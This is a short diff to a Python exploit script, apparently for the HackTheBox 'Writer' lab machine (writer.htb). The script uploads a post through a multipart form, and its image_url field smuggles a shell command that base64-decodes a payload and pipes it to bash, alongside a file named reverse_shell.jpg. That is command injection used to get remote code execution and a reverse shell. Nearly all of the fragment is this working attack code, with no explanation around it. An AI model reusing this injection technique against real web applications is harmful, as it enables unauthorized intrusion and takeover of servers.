@@ -61,27 +61,14 @@ def makeRequest():
         "title": (None, ''),
         "tagline": (None, ''),
         "image": image,
-        "image_url": (None, ''),
-        "content": (None, '')
-    }
-
-    r = s.post(add_post, files=file_image)
-
-    p2.status("Uploaded [✔]")
-
-    route_image = {
-        "author": (None, ''),
-        "title": (None, ''),
-        "tagline": (None, ''),
-        "image": ('', ''),
         "image_url": (None, f'file:///var/www/writer.htb/writer/static/img/reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;'),
         "content": (None, '')
     }
 
+    r = s.post(add_post, files=file_image)
+    
     p2.success("Injected payload [✔]")
-
-    r = s.post(add_post, files=route_image)
-
+    
 if __name__ == '__main__':
 
     try:
